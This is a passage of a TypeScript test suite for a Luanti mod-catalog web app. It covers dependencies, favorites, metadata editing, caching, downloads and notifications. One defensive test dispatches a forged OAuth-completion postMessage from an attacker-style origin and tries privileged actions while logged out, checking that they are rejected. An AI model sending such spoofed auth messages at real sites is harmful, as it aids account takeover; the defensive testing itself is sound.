      provides: ['mesecons', 'mesecons_torch'],
      tags: ['technology'],
      downloads: 120000,
      score: 4.9,
      favorites_count: 5,
      score_downloads: 450,
      game_support: mergedGames
    });
    const reqAddon = (pkgService as any).normalizePackage({
      id: 'mt-mods/pipeworks',
      author: 'mt-mods',
      name: 'pipeworks',
      title: 'Pipeworks',
      type: 'mod',
      short_desc: 'Item transport tubes and mesecons integration',
      dependencies: ['mesecons'],
      tags: ['technology', 'transport'],
      downloads: 80000,
      score: 4.8
    });
    const optAddon = (pkgService as any).normalizePackage({
      id: 'mt-mods/technic',
      author: 'mt-mods',
      name: 'technic',
      title: 'Technic',
      type: 'mod',
      short_desc: 'Industrial machines and power networks',
      optional_dependencies: ['mesecons_torch'],
      tags: ['technology'],
      downloads: 95000,
      score: 4.8
    });
    (pkgService as any)._packages.set([baseLib, reqAddon, optAddon]);

    const revDeps = pkgService.getReverseDependencies(baseLib);
    expect(revDeps.totalCount).toBe(2);
    expect(revDeps.requiredBy.map((p: LuantiPackage) => p.name)).toEqual(['pipeworks']);
    expect(revDeps.optionalFor.map((p: LuantiPackage) => p.name)).toEqual(['technic']);

    // 6. First-Class LuantiHub Favorites Integration & Optimistic Counter Updates
    if (settingsService.isFavorite(baseLib.id)) {
      settingsService.removeFavorite(baseLib.id);
    }
    pkgService.togglePackageFavorite(baseLib);
    expect(settingsService.isFavorite(baseLib.id)).toBe(true);
    const updatedBaseLib = pkgService.packages().find(p => p.id === baseLib.id)!;
    expect(updatedBaseLib.favorites_count).toBe(6);

    // Recommended From Your Favorites swimlane surfaces pipeworks & technic (shared tags + reverse dependency)
    const favRecs = pkgService.recommendedFromFavorites();
    expect(favRecs.length).toBe(2);
    expect(favRecs.map(p => p.name)).toContain('pipeworks');

    // Game Ecosystem Filter & Match Score Penalty for Incompatible Games
    settingsService.preferredGame.set('mineclone2');
    const scoreIncompatible = pkgService.getMatchScore(updatedBaseLib);
    settingsService.preferredGame.set('minetest_game');
    const scoreCompatible = pkgService.getMatchScore(updatedBaseLib);
    expect(scoreCompatible).toBeGreaterThan(scoreIncompatible);
    settingsService.preferredGame.set('all');

    pkgService.setGameFilter('minetest_game');
    expect(pkgService.filteredPackages().map(p => p.name)).toContain('mesecons');
    pkgService.setGameFilter('mineclone2');
    expect(pkgService.filteredPackages().map(p => p.name)).not.toContain('mesecons');
    pkgService.resetFilters();

    // 7. LuantiHub-First /api/minetest_versions & /api/content_warnings Endpoints
    expect(LUANTIHUB_ENGINE_VERSIONS.length).toBeGreaterThan(5);
    expect(LUANTIHUB_CONTENT_WARNINGS.length).toBeGreaterThanOrEqual(5);

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async () => new Response('[]', { status: 200 })) as typeof fetch;
    try {
      const verRes = await minetestVersionsOnRequestGet({
        request: new Request('https://luantihub.org/api/minetest_versions'),
        env: {}
      });
      expect(verRes.status).toBe(200);
      const verJson = await verRes.json();
      expect(Array.isArray(verJson)).toBe(true);
      expect(verJson.some((v: any) => v.name === '5.11.0')).toBe(true);

      const cwRes = await contentWarningsOnRequestGet({
        request: new Request('https://luantihub.org/api/content_warnings'),
        env: {}
      });
      expect(cwRes.status).toBe(200);
      const cwJson = await cwRes.json();
      expect(Array.isArray(cwJson)).toBe(true);
      expect(cwJson.some((w: any) => w.name === 'violence')).toBe(true);
    } finally {
      globalThis.fetch = origFetch;
    }

    // 8. Author-Editable Package Metadata via PATCH /api/packages/:author/:name
    const token = await createSessionToken(
      'user-sakel',
      'test-secret-key-for-metadata-patch',
      {
        username: 'sakel-hub',
        displayName: 'SaKeL',
        avatarUrl: 'logo.svg',
        provider: 'github',
        role: 'admin',
        verified: true
      }
    );
    const savedColumns: Record<string, any> = {};
    const mockDb = {
      prepare(sql: string) {
        return {
          bind(...args: any[]) {
            return {
              async first() {
                if (sql.includes('FROM users')) {
                  return {
                    id: 'user-sakel',
                    username: 'sakel-hub',
                    display_name: 'SaKeL',
                    role: 'admin',
                    verified: 1
                  };
                }
                if (sql.includes('FROM packages')) {
                  return {
                    id: 'SaKeL/everness',
                    author: 'SaKeL',
                    author_name: 'SaKeL',
                    name: 'everness',
                    title: 'Everness',
                    type: 'mod',
                    short_desc: 'Explore new biomes',
                    tags: '["mod","environment"]',
                    dev_state: 'ACTIVELY_DEVELOPED',
                    content_warnings: '[]',
                    min_minetest_version: '5.8.0',
                    max_minetest_version: null,
                    supports_all_games: 0,
                    game_support: '[]',
                    translations: '{}'
                  };
                }
                return null;
              },
              async all() {
                if (sql.includes('FROM user_identities')) {
                  return {
                    results: [{ provider: 'github', username: 'sakel-hub', verified: 1 }]
                  };
                }
                return { results: [] };
              },
              async run() {
                if (sql.includes('UPDATE packages')) {
                  savedColumns['args'] = args;
                }
                return { success: true };
              }
            };
          },
          async run() {
            return { success: true };
          }
        };
      }
    };

    const patchRes = await packageDetailOnRequestPatch({
      request: new Request('https://luantihub.org/api/packages/SaKeL/everness', {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `lh_session=${token}`
        },
        body: JSON.stringify({
          tags: ['worldgen', 'biomes'],
          dev_state: 'ACTIVELY_DEVELOPED',
          content_warnings: [' spiders_and_insects '],
          min_minetest_version: '5.10.0',
          max_minetest_version: '5.11.0',
          supports_all_games: true,
          game_support: [
            {
              confidence: 11,
              supports: true,
              game: { id: 'Minetest/minetest_game', author: 'Minetest', name: 'minetest_game', title: 'Minetest Game' }
            }
          ],
          translations: {
            de: { title: 'Everness DE', short_desc: 'Neue Biome' }
          }
        })
      }),
      env: { DB: mockDb, SESSION_SECRET: 'test-secret-key-for-metadata-patch', ADMIN_USERS: 'sakel-hub' },
      params: { author: 'SaKeL', name: 'everness' }
    });
    expect(patchRes.status).toBe(200);
    const patchData = await patchRes.json();
    expect(patchData.ok).toBe(true);
    expect(patchData.dev_state).toBe('ACTIVELY_DEVELOPED');
    expect(patchData.content_warnings).toEqual(['spiders_and_insects']);
    expect(patchData.min_minetest_version).toBe('5.10.0');
    expect(patchData.max_minetest_version).toBe('5.11.0');
    expect(patchData.supports_all_games).toBe(true);
    expect(patchData.game_support.length).toBe(1);
    expect(patchData.translations.de.title).toBe('Everness DE');
  });

  it('should hide the package Report button in Package Detail Modal when viewing own package', () => {
    const pkgService = TestBed.inject(PackageService);
    const authService = TestBed.inject(AuthService);
    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;

    const pkg = (pkgService as any).normalizePackage({
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod',
      source: 'git',
      provider: 'github',
      repo_url: 'https://github.com/SaKeL/everness'
    });

    (pkgService as any)._activePackage.set(pkg);
    modalComp.package = pkg;

    // 1. Non-author user sees the Report Package button
    (authService as any)._currentUser.set({
      id: 'u_other',
      username: 'other_user',
      identities: [{ provider: 'github', username: 'other_user', verified: true }]
    });
    modalFixture.detectChanges();

    const reportBtnForOther = modalFixture.nativeElement.querySelector('button[aria-label="Report or Flag Package"]');
    expect(reportBtnForOther).not.toBeNull();

    // 2. Author of the package does not see the Report Package button and cannot open the report form
    (authService as any)._currentUser.set({
      id: 'u_sakel',
      username: 'SaKeL',
      identities: [{ provider: 'github', username: 'SaKeL', verified: true }]
    });
    modalFixture.detectChanges();

    const reportBtnForAuthor = modalFixture.nativeElement.querySelector('button[aria-label="Report or Flag Package"]');
    expect(reportBtnForAuthor).toBeNull();

    modalComp.toggleReportForm();
    expect(modalComp.isReportOpen()).toBe(false);

    // 3. "Edit Metadata & Tags" button and editor live in the wider left column (lg:col-span-2) above Screenshots & Media
    const leftCol = modalFixture.nativeElement.querySelector('.lg\\:col-span-2');
    expect(leftCol).not.toBeNull();
    expect(leftCol.textContent).toContain('Edit Metadata & Tags');
  });

  it('should protect UI action handlers and services against DOM manipulation when logged out or lacking author/admin privileges', async () => {
    const pkgService = TestBed.inject(PackageService);
    const authService = TestBed.inject(AuthService);

    const pkg = (pkgService as any).normalizePackage({
      id: 'SaKeL/everness',
      author: 'SaKeL',
      name: 'everness',
      title: 'Everness',
      type: 'mod',
      source: 'git',
      provider: 'github',
      repo_url: 'https://github.com/SaKeL/everness'
    });

    // 1. Logged-out visitor: DOM-manipulated calls to protected handlers must be blocked
    (authService as any)._currentUser.set(null);

    const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFixture.componentInstance;
    modalComp.package = pkg;
    modalFixture.detectChanges();

    // Clicking Report Package while logged out prompts Sign In instead of opening report form
    modalComp.toggleReportForm();
    expect(modalComp.isReportOpen()).toBe(false);
    expect(authService.isAuthModalOpen()).toBe(true);
    authService.closeAuthModal();

    // Direct call to openEditTags / onKillSwitch as guest is rejected
    modalComp.openEditTags();
    expect(modalComp.isEditingTags()).toBe(false);

    // Service-level calls while logged out return access/auth error without mutating state
    const savePromoRes = await pkgService.savePromotion({ title: 'Hack Promo' });
    expect(savePromoRes.success).toBe(false);
    const delPromoRes = await pkgService.deletePromotion('promo-1');
    expect(delPromoRes.success).toBe(false);
    const reportRes = await pkgService.reportPackage(pkg, 'other', 'Fake report while logged out');
    expect(reportRes.success).toBe(false);
    const reviewRes = await pkgService.submitReview(pkg, { rating: 5, comment: 'Anon review' });
    expect(reviewRes.success).toBe(false);
    const profileRes = await authService.updateProfile({ display_name: 'Hacked' });
    expect(profileRes.success).toBe(false);

    // 2. Non-admin logged-in user: DOM-manipulated calls to Admin tabs & bulk moderation in ProfileDrawerComponent must be blocked
    (authService as any)._currentUser.set({
      id: 'u_regular',
      username: 'regular_user',
      role: 'user',
      is_admin: false,
      identities: [{ provider: 'github', username: 'regular_user', verified: true }]
    });

    const drawerFixture = TestBed.createComponent(ProfileDrawerComponent);
    const drawerComp = drawerFixture.componentInstance;
    drawerFixture.detectChanges();

    drawerComp.onSelectModerationTab();
    expect(drawerComp.activeTab()).not.toBe('moderation');
    drawerComp.onSelectPromotionsTab();
    expect(drawerComp.activeTab()).not.toBe('promotions');

    const bulkRes = await authService.bulkModerationAction('clear_closed');
    expect(bulkRes.success).toBe(false);

    // 3. Synthetic postMessage OAuth events are completely inert (no cross-window postMessage auth surface)
    (authService as any)._currentUser.set(null);
    window.dispatchEvent(
      new MessageEvent('message', {
        origin: 'https://evil.example.com',
        data: { type: 'LH_OAUTH_COMPLETE', success: true, provider: 'github' }
      })
    );
    expect(authService.currentUser()).toBeNull();
  });

  it('should share warm boot catalog with in-game client (HIT-BOOT-SHARED), isolate release IDs across authors in /api/updates/, and refresh .zip archives on in-game ?reason=update', async () => {
    const { onRequestGet: onPackagesGet } = await import('../../functions/api/packages/index');
    const { onRequestGet: onUpdatesGet } = await import('../../functions/api/updates');
    const { onRequest: onDownloadGet } = await import('../../functions/api/packages/[author]/[name]/download');
    const { invalidateEdgeCacheKeys } = await import('../../functions/api/lib/upstream');

    await invalidateEdgeCacheKeys([
      '/__api_boot_catalog_bundle_v19',
      'https://cache.luantihub.internal/__api_updates_v3_',
      'https://edge-cache.luantihub.local/pkg-detail-v19/full/tenplus1/farming'
    ]);

    const encodeAscii = (str: string) => {
      const out = new Uint8Array(str.length);
      for (let i = 0; i < str.length; i++) out[i] = str.charCodeAt(i) & 0xff;
      return out;
    };
    const buildZip = (files: Array<{ path: string; content: string }>): Uint8Array => {
      const crcTable = new Uint32Array(256);
      for (let n = 0; n < 256; n++) {
        let c = n;
        for (let k = 0; k < 8; k++) c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1);
        crcTable[n] = c >>> 0;
      }
      const crc32 = (buf: Uint8Array) => {
        let crc = 0xffffffff;
        for (let i = 0; i < buf.length; i++) crc = crcTable[(crc ^ buf[i]) & 0xff] ^ (crc >>> 8);
        return (crc ^ 0xffffffff) >>> 0;
      };
      const localParts: Uint8Array[] = [];
      const centralParts: Uint8Array[] = [];
      let localOffset = 0;
      for (const f of files) {
        const nameBytes = encodeAscii(f.path);
        const dataBytes = encodeAscii(f.content);
        const crc = crc32(dataBytes);
        const lfh = new Uint8Array(30 + nameBytes.length);
        const lfhView = new DataView(lfh.buffer);
        lfhView.setUint32(0, 0x04034b50, true);
        lfhView.setUint16(4, 20, true);
        lfhView.setUint32(14, crc, true);
        lfhView.setUint32(18, dataBytes.length, true);
        lfhView.setUint32(22, dataBytes.length, true);
        lfhView.setUint16(26, nameBytes.length, true);
        lfh.set(nameBytes, 30);
        localParts.push(lfh, dataBytes);

        const cdh = new Uint8Array(46 + nameBytes.length);
        const cdhView = new DataView(cdh.buffer);
        cdhView.setUint32(0, 0x02014b50, true);
        cdhView.setUint16(4, 20, true);
        cdhView.setUint16(6, 20, true);
        cdhView.setUint32(16, crc, true);
        cdhView.setUint32(20, dataBytes.length, true);
        cdhView.setUint32(24, dataBytes.length, true);
        cdhView.setUint16(28, nameBytes.length, true);
        cdhView.setUint32(42, localOffset, true);
        cdh.set(nameBytes, 46);
        centralParts.push(cdh);
        localOffset += lfh.length + dataBytes.length;
      }
      let cdSize = 0;
      for (const p of centralParts) cdSize += p.length;
      const eocd = new Uint8Array(22);
      const eocdView = new DataView(eocd.buffer);
      eocdView.setUint32(0, 0x06054b50, true);
      eocdView.setUint16(8, files.length, true);
      eocdView.setUint16(10, files.length, true);
      eocdView.setUint32(12, cdSize, true);
      eocdView.setUint32(16, localOffset, true);
      const out = new Uint8Array(localOffset + cdSize + 22);
      let pos = 0;
      for (const p of [...localParts, ...centralParts, eocd]) {
        out.set(p, pos);
        pos += p.length;
      }
      return out;
    };

    const zipV1 = buildZip([
      { path: 'farming-v1/mod.conf', content: 'name = farming\ntitle = Farming Redo v1\n' },
      { path: 'farming-v1/init.lua', content: '-- v1\n' }
    ]);
    const zipV2 = buildZip([
      { path: 'farming-v2/mod.conf', content: 'name = farming\ntitle = Farming Redo v2 Updated\ndescription = New crops added\n' },
      { path: 'farming-v2/init.lua', content: '-- v2 with new crops and mechanics\n' }
    ]);

    let currentUpstreamReleaseId = 28100;
    let currentUpstreamCommit = '1111111a';

    const edgeStore = new Map<string, Response>();
    const origCaches = (globalThis as any).caches;
    (globalThis as any).caches = {
      default: {
        match: async (req: Request | string) => {
          const k = typeof req === 'string' ? req : req.url;
          const hit = edgeStore.get(k);
          return hit ? hit.clone() : undefined;
        },
        put: async (req: Request | string, res: Response) => {
          const k = typeof req === 'string' ? req : req.url;
          edgeStore.set(k, res.clone());
        },
        delete: async (req: Request | string) => {
          const k = typeof req === 'string' ? req : req.url;
          return edgeStore.delete(k);
        }
      }
    };

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: any) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('/api/packages/?fmt=vcs') || url.includes('/api/packages?fmt=vcs')) {
        return new Response(
          JSON.stringify([
            {
              author: 'TenPlus1',
              name: 'farming',
              title: 'Farming Redo',
              type: 'mod',
              short_description: 'Adds many new crops',
              release: currentUpstreamReleaseId,
              thumbnail: 'https://content.luanti.org/thumbnails/1/farming_shot.png.png',
              downloads: 120000,
              score: 450
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/api/scores/')) {
        return new Response(JSON.stringify({}), { status: 200, headers: { 'Content-Type': 'application/json' } });
      }
      if (url.includes('/api/updates/')) {
        return new Response(
          JSON.stringify({
            'TenPlus1/farming': currentUpstreamReleaseId,
            'SaKeL/everness': 29500
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/packages/TenPlus1/farming/releases/')) {
        return new Response(
          JSON.stringify([
            {
              id: currentUpstreamReleaseId,
              title: currentUpstreamReleaseId === 28200 ? 'v2.0' : 'v1.0',
              commit: currentUpstreamCommit,
              url: `/uploads/farming_${currentUpstreamReleaseId}.zip`
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('/packages/TenPlus1/farming/for-client/')) {
        return new Response(
          JSON.stringify({
            author: 'TenPlus1',
            name: 'farming',
            release: currentUpstreamReleaseId,
            repo: 'https://codeberg.org/tenplus1/farming'
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      if (url.includes('1111111a.zip') || url.includes('farming_28100.zip')) {
        return new Response(zipV1 as unknown as BodyInit, {
          status: 200,
          headers: { 'Content-Type': 'application/zip' }
        });
      }
      if (url.includes('2222222b.zip') || url.includes('farming_28200.zip')) {
        return new Response(zipV2 as unknown as BodyInit, {
          status: 200,
          headers: { 'Content-Type': 'application/zip' }
        });
      }
      return new Response('Not Found', { status: 404 });
    }) as typeof fetch;

    const mockEnv = {
      DB: {
        prepare: (sql: string) => ({
          bind: (..._args: any[]) => ({
            all: async () => ({ results: [] }),
            first: async () => null,
            run: async () => ({ success: true })
          }),
          all: async () => {
            if (sql.includes('FROM packages')) {
              return {
                results: [
                  {
                    id: 'Alice/farming',
                    author_name: 'Alice',
                    name: 'farming',
                    title: 'Alice Custom Farming',
                    type: 'mod',
                    provider: 'github',
                    repo_url: 'https://github.com/Alice/farming',
                    updated_at: '2026-10-20T00:00:00Z',
                    created_at: '2026-10-01T00:00:00Z',
                    status: 'active'
                  },
                  {
                    id: 'sakel-hub/everness',
                    author_name: 'sakel-hub',
                    name: 'everness',
                    title: 'Everness',
                    type: 'mod',
                    provider: 'bitbucket',
                    repo_url: 'https://bitbucket.org/SaKeL/everness',
                    updated_at: '2026-10-20T00:00:00Z',
                    created_at: '2026-10-01T00:00:00Z',
                    status: 'active'
                  }
                ]
              };
            }
            return { results: [] };
          },
          first: async () => null,
          run: async () => ({ success: true })
        })
      }
    };

    try {
      // 1. Warm the PWA boot catalog (?boot=1) and verify PWA tiles/dialogs receive full BunnyCDN URLs & metadata
      const bootRes = await onPackagesGet({
        request: new Request('https://luantihub.org/api/packages/?boot=1'),
        env: mockEnv
      });
      expect(bootRes.status).toBe(200);
      const bootJson: any = await bootRes.json();
      const bootFarming = bootJson.packages.find((p: any) => p.name === 'farming' && p.author === 'TenPlus1');
      expect(bootFarming).toBeTruthy();
      expect(bootFarming.thumbnail).toBe('https://cdn.content.luanti.org/uploads/farming_shot.png');
      expect(bootFarming.banner).toBe('https://cdn.content.luanti.org/uploads/farming_shot.png?width=1100&aspect_ratio=16:9');
      expect(bootFarming.downloads).toBe(120000);

      // 2. Subsequent in-game Luanti client request immediately hits HIT-BOOT-SHARED with compact slimList & legacy thumbnail URL
      const clientRes = await onPackagesGet({
        request: new Request('https://luantihub.org/api/packages/?protocol_version=49&engine_version=5.11.0&hide=desktop_default&hide=nonfree'),
        env: mockEnv
      });
      expect(clientRes.status).toBe(200);
      expect(clientRes.headers.get('X-LuantiHub-Cache')).toBe('HIT-BOOT-SHARED');
      const clientPackages: any[] = await clientRes.json();
      const clientFarming = clientPackages.find((p: any) => p.name === 'farming' && p.author === 'TenPlus1');
      expect(clientFarming).toBeTruthy();
      expect(clientFarming.thumbnail).toBe('https://content.luanti.org/thumbnails/1/farming_shot.png');
      expect(clientFarming.short_desc).toBeUndefined();

      // 3. Verify /api/updates/ aligns SaKeL/everness (29500) with sakel-hub/everness (29500),
      // while keeping Alice/farming's Git timestamp distinct from TenPlus1/farming (28100)
      const updatesRes = await onUpdatesGet({
        request: new Request('https://luantihub.org/api/updates/'),
        env: mockEnv
      });
      expect(updatesRes.status).toBe(200);
      const updatesJson: Record<string, number> = await updatesRes.json();
      expect(updatesJson['TenPlus1/farming']).toBe(28100);
      expect(updatesJson['SaKeL/everness']).toBe(29500);
      expect(updatesJson['sakel-hub/everness']).toBe(29500);
      expect(updatesJson['Alice/farming']).toBeGreaterThan(1700000000);
      expect(updatesJson['Alice/farming']).not.toBe(28100);

      // 4. Download v1 in-game (?reason=new) and verify it caches v1
      const dlNewRes = await onDownloadGet({
        request: new Request('https://luantihub.org/api/packages/TenPlus1/farming/download/?reason=new'),
        env: mockEnv,
        params: { author: 'TenPlus1', name: 'farming' }
      } as any);
      expect(dlNewRes.status).toBe(200);
      const dlNewBytes = new Uint8Array(await dlNewRes.arrayBuffer());
      expect(dlNewBytes.byteLength).toBeGreaterThan(50);

      // 5. Simulate upstream release update (28100 -> 28200, commit 1111111a -> 2222222b)
      currentUpstreamReleaseId = 28200;
      currentUpstreamCommit = '2222222b';
      await invalidateEdgeCacheKeys(['https://edge-cache.luantihub.local/pkg-detail-v19/full/tenplus1/farming']);

      // In-game update (?reason=update) resolves release 28200 and fetches the new zipV2 archive (larger byteLength)
      const dlUpdateRes = await onDownloadGet({
        request: new Request('https://luantihub.org/api/packages/TenPlus1/farming/download/?reason=update'),
        env: mockEnv,
        params: { author: 'TenPlus1', name: 'farming' }
      } as any);
      expect(dlUpdateRes.status).toBe(200);
      const dlUpdateBytes = new Uint8Array(await dlUpdateRes.arrayBuffer());
      expect(dlUpdateBytes.byteLength).toBeGreaterThan(dlNewBytes.byteLength);
    } finally {
      globalThis.fetch = origFetch;
      (globalThis as any).caches = origCaches;
    }
  });

  it('should notify for brand-new ContentDB packages (via recentlyAdded created_at / approved_at) and Git packages across foreground PwaService and Service Worker evaluateCatalogNotificationsBatch without false positives on existing catalog', async () => {
    const {
      evaluateCatalogNotificationsBatch,
      buildNewGitPackageNotificationSpec
    } = await import('./core/utils/notification-engine');
    const pkgService = TestBed.inject(PackageService);
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);

    settingsService.notificationsEnabled.set(true);
    settingsService.notifyNewGitPackages.set(true);
    settingsService.notifyPackageUpdates.set(true);

    const nowMs = Date.now();
    const baselineSeededAt = nowMs - 2 * 3600 * 1000; // 2 hours ago
    const recentApprovedIso = new Date(nowMs - 15 * 60 * 1000).toISOString(); // 15 minutes ago
    const oldCreatedIso = new Date(nowMs - 4 * 24 * 3600 * 1000).toISOString(); // 4 days ago

    // 1. Existing user migration safety:
    // User previously only had Git packages in `lh_known_git_packages_v1`, while `lh_known_package_versions_v1`
    // already tracked existing ContentDB packages (`tenplus1/farming`, `wuzzy/mineclone2`).
    // A brand-new ContentDB package (`newauthor/crystal_realms`) arrives in `packages` (without `created_at` on the slim row)
    // and in `recentlyAdded` (with `created_at: recentApprovedIso` resolved from ContentDB `approved_at`).
    localStorage.setItem('lh_notif_baseline_seeded_at_v1', String(baselineSeededAt));
    localStorage.setItem('lh_known_git_packages_v1', JSON.stringify(['sakel-hub/pixie']));
    localStorage.setItem(
      'lh_known_package_versions_v1',
      JSON.stringify({
        'tenplus1/farming': `28100|${oldCreatedIso}|`,
        'wuzzy/mineclone2': `39534|${oldCreatedIso}|`,
        'sakel-hub/pixie': `1|${oldCreatedIso}|1111111a`
      })
    );
    localStorage.removeItem('lh_seen_notification_tags');

    const sentForegroundNotifs: any[] = [];
    const origSend = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (payload: any) => {
      sentForegroundNotifs.push(payload);
      return true;
    };

    try {
      const bootPayload = {
        packages: [
          {
            id: 'TenPlus1/farming',
            author: 'TenPlus1',
            name: 'farming',
            title: 'Farming Redo',
            type: 'mod',
            source: 'official',
            sources: ['official'],
            release_id: 28100,
            updated_at: oldCreatedIso
          },
          {
            id: 'Wuzzy/mineclone2',
            author: 'Wuzzy',
            name: 'mineclone2',
            title: 'VoxeLibre',
            type: 'game',
            source: 'official',
            sources: ['official'],
            release_id: 39534,
            updated_at: oldCreatedIso
          },
          {
            id: 'NewAuthor/crystal_realms',
            author: 'NewAuthor',
            name: 'crystal_realms',
            title: 'Crystal Realms',
            type: 'mod',
            short_desc: 'Adds glowing crystal caverns and dimension portals.',
            source: 'official',
            sources: ['official'],
            thumbnail: 'https://cdn.content.luanti.org/uploads/crystal_realms.png',
            release_id: 41200
            // Note: slim /api/packages/ list row does NOT include created_at; it comes from recentlyAdded below!
          }
        ],
        recentlyAdded: [
          {
            id: 'NewAuthor/crystal_realms',
            author: 'NewAuthor',
            name: 'crystal_realms',
            title: 'Crystal Realms',
            type: 'mod',
            short_desc: 'Adds glowing crystal caverns and dimension portals.',
            source: 'official',
            sources: ['official'],
            thumbnail: 'https://cdn.content.luanti.org/uploads/crystal_realms.png',
            release_id: 41200,
            created_at: recentApprovedIso
          }
        ]
      };

      // Foreground applyBootPayload must merge `recentlyAdded` created_at BEFORE running checkAndNotifyNewGitPackages
      (pkgService as any).applyBootPayload(bootPayload);

      // Verify Crystal Realms in catalog has its `created_at` stamped immediately
      const catalogCrystal = pkgService.packages().find(p => p.id === 'NewAuthor/crystal_realms');
      expect(catalogCrystal?.created_at).toBe(recentApprovedIso);

      // Exactly 1 notification fired for the brand-new ContentDB package (and 0 false positives for Farming Redo or VoxeLibre)
      expect(sentForegroundNotifs.length).toBe(1);
      expect(sentForegroundNotifs[0].title).toBe('New Package · [MOD] Crystal Realms');
      expect(sentForegroundNotifs[0].body).toContain('by NewAuthor');
      expect(sentForegroundNotifs[0].body).toContain('Adds glowing crystal caverns and dimension portals.');
      expect(sentForegroundNotifs[0].tag).toBe('lh-new-git-pkg-newauthor/crystal_realms');
      expect(sentForegroundNotifs[0].category).toBe('new_git_package');
      expect(sentForegroundNotifs[0].data?.packageId).toBe('NewAuthor/crystal_realms');

      // 2. Verify Service Worker `evaluateCatalogNotificationsBatch` produces the exact same notification
      //    when given `bootPayload.packages` + `bootPayload.recentlyAdded`
      const swEval = evaluateCatalogNotificationsBatch(
        bootPayload,
        {
          prefs: {
            notificationsEnabled: true,
            notifyNewGitPackages: true,
            notifyPackageUpdates: true,
            notifyNewReviews: true
          },
          baselineSeededAt,
          knownGitPackages: ['sakel-hub/pixie'],
          knownPackageVersions: {
            'tenplus1/farming': `28100|${oldCreatedIso}|`,
            'wuzzy/mineclone2': `39534|${oldCreatedIso}|`,
            'sakel-hub/pixie': `1|${oldCreatedIso}|1111111a`
          },
          packageUpdateCooldowns: {}
        },
        nowMs
      );

      expect(swEval.notifications.length).toBe(1);
      expect(swEval.notifications[0].title).toBe('New Package · [MOD] Crystal Realms');
      expect(swEval.notifications[0].tag).toBe('lh-new-git-pkg-newauthor/crystal_realms');
      expect(swEval.stateUpdates.knownGitPackages).toContain('newauthor/crystal_realms');

      // 3. Verify pure Git packages still use 'New Git Package · [TYPE] Title'
      const gitSpec = buildNewGitPackageNotificationSpec(
        {
          id: 'sakel-hub/new_git_mod',
          author: 'sakel-hub',
          name: 'new_git_mod',
          title: 'New Git Mod',
          type: 'mod',
          source: 'git',
          sources: ['git']
        },
        'sakel-hub/new_git_mod',
        nowMs
      );
      expect(gitSpec.title).toBe('New Git Package · [MOD] New Git Mod');

      // 4. Verify deferred `created_at` hydration: if a new ContentDB package first arrives in `packages`
      //    WITHOUT `created_at` (e.g. before `ensureRecentlyAddedLoaded()` completes), it is NOT prematurely
      //    marked as known, so when `created_at` arrives shortly after, the notification fires!
      (pkgService as any).applyBootPayload({
        packages: [
          ...bootPayload.packages,
          {
            id: 'NewAuthor/deferred_cdb_mod',
            author: 'NewAuthor',
            name: 'deferred_cdb_mod',
            title: 'Deferred ContentDB Mod',
            type: 'mod',
            short_desc: 'Hydrated asynchronously by recentlyAdded.',
            source: 'official',
            sources: ['official'],
            release_id: 41205
          }
        ]
      });
      // Still 1 notification before `created_at` is hydrated
      expect(sentForegroundNotifs.length).toBe(1);

      // Now `recentlyAdded` hydration supplies `created_at`
      const deferredCount = pwaService.checkAndNotifyNewGitPackages(
        [
          {
            id: 'NewAuthor/deferred_cdb_mod',
            author: 'NewAuthor',
            name: 'deferred_cdb_mod',
            title: 'Deferred ContentDB Mod',
            type: 'mod',
            short_desc: 'Hydrated asynchronously by recentlyAdded.',
            source: 'official',
            sources: ['official'],
            created_at: recentApprovedIso
          }
        ],
        { isBaselineSeedAllowed: false }
      );
      expect(deferredCount).toBe(1);
      expect(sentForegroundNotifs.length).toBe(2);
      expect(sentForegroundNotifs[1].title).toBe('New Package · [MOD] Deferred ContentDB Mod');
      expect(sentForegroundNotifs[1].tag).toBe('lh-new-git-pkg-newauthor/deferred_cdb_mod');
    } finally {
      pwaService.sendNativeNotification = origSend;
      localStorage.removeItem('lh_known_git_packages_v1');
      localStorage.removeItem('lh_known_package_versions_v1');
      localStorage.removeItem('lh_notif_baseline_seeded_at_v1');
      localStorage.removeItem('lh_seen_notification_tags');
    }
  });

  it('should exclude logged-in author packages across ContentDB and Git handles from recommendedFromFavorites and getSimilarPackages while enforcing diversity, optional_dependencies add-ons, and content filters', () => {
    const pkgService = TestBed.inject(PackageService);
    const authService = TestBed.inject(AuthService);
    const settingsService = TestBed.inject(SettingsService);

    const favMod = (pkgService as any).normalizePackage({
      id: 'TenPlus1/farming',
      author: 'TenPlus1',
      name: 'farming',
      title: 'Farming Redo',
      type: 'mod',
      short_desc: 'Expanded farming crops and food items.',
      tags: ['survival', 'plants_and_farming'],
      dependencies: ['default'],
      game_support: [{ game: { name: 'minetest_game', title: 'Minetest Game' }, supports: true }],
      downloads: 180000,
      score: 4.9
    });

    // Logged-in user's own packages across ContentDB ('SaKeL') and Git ('sakel-hub')
    const ownCdbMod = (pkgService as any).normalizePackage({
      id: 'SaKeL/x_farming',
      author: 'SaKeL',
      name: 'x_farming',
      title: 'X Farming',
      type: 'mod',
      short_desc: 'Extra crops and survival farming items.',
      tags: ['survival', 'plants_and_farming'],
      dependencies: ['default', 'farming'],
      game_support: [{ game: { name: 'minetest_game', title: 'Minetest Game' }, supports: true }],
      downloads: 95000,
      score: 4.9
    });
    const ownGitMod = (pkgService as any).normalizePackage({
      id: 'sakel-hub/pixie_farming',
      author: 'sakel-hub',
      name: 'pixie_farming',
      title: 'Pixie Farming',
      type: 'mod',
      short_desc: 'Magical farming companion.',
      tags: ['survival', 'plants_and_farming'],
      dependencies: ['farming'],
      downloads: 12000,
      score: 5.0,
      source: 'git',
      sources: ['git']
    });

